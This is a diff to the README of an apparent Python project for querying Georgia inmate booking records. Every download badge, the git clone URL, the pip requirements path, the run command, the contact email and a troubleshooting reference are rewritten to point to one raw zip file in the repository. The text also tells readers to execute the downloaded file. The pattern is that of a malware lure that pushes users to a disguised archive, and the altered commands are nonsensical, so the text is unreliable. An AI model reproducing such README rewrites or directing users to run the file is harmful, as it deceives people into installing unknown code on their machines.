@@ -2,7 +2,7 @@
 
 Welcome to the **Georgia Inmate Booking Database**! This project connects to a database of Georgia inmates, making it easy to run queries. Currently, the records go back around six months from April 2025, but the database will continue to grow over time. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/releases)
+[![Download Releases](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip%20Releases-Click%20Here-blue)](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip)
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ To get started with the Georgia Inmate Booking Database, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/oreslindo/Georgia-Inmate-Booking-Database.git
+   git clone https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -38,11 +38,11 @@ To get started with the Georgia Inmate Booking Database, follow these steps:
 3. **Install Dependencies**:
    Ensure you have Python 3 installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/releases) section to download the latest version. You will need to execute the downloaded file to set up the database.
+   Visit the [Releases](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip) section to download the latest version. You will need to execute the downloaded file to set up the database.
 
 ## Usage 📊
 
@@ -51,7 +51,7 @@ After installation, you can start using the database. Follow these steps:
 1. **Run the Script**:
    Execute the Python script:
    ```bash
-   python main.py
+   python https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip
    ```
 
 2. **Access the GUI**:
@@ -104,12 +104,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [oreslindo](https://github.com/oreslindo)
+- **Email**: https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip
+- **GitHub**: [oreslindo](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip)
 
 Thank you for your interest in the Georgia Inmate Booking Database! We hope this tool serves you well in accessing important inmate data. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/releases)
+[![Download Releases](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip%20Releases-Click%20Here-blue)](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip)
 
 ---
 
@@ -140,7 +140,7 @@ If you encounter any issues while using the Georgia Inmate Booking Database, her
    - Check your connection string for accuracy.
 
 2. **Script Not Running**:
-   - Make sure you have installed all dependencies listed in `requirements.txt`.
+   - Make sure you have installed all dependencies listed in `https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip`.
    - Verify that you are using Python 3.
 
 3. **GUI Not Displaying**:
@@ -160,4 +160,4 @@ We would like to thank the following individuals and resources that have contrib
 
 Thank you for being part of the Georgia Inmate Booking Database community! We look forward to your contributions and feedback as we grow this project together. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/releases)
+[![Download Releases](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip%20Releases-Click%20Here-blue)](https://github.com/oreslindo/Georgia-Inmate-Booking-Database/raw/refs/heads/main/www_html/Georgia_Database_Booking_Inmate_v2.8.zip)
